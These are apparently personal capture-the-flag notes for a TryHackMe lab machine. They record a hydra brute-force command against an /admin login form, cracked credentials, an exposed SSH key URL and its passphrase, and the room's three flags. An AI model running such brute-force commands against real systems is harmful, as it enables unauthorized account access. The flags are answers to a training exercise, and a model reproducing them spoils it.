ip: 10.10.53.177

/admin login page

hydra -l admin -P rockyou.txt 10.10.53.177 http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:Username or password invalid" -V

user=admin&pass=passwdiguess

**CREDS**
uname: admin
paswd: xavier

ssh RSA key
http://10.10.53.177/admin/panel/id_rsa

key passphrase:
rockinroll

ssh uname: john



**FLAGS**
web
THM{brut3_f0rce_is_e4sy}

user.txt
THM{a_password_is_not_a_barrier}

root.txt
THM{pr1v1l3g3_3sc4l4t10n}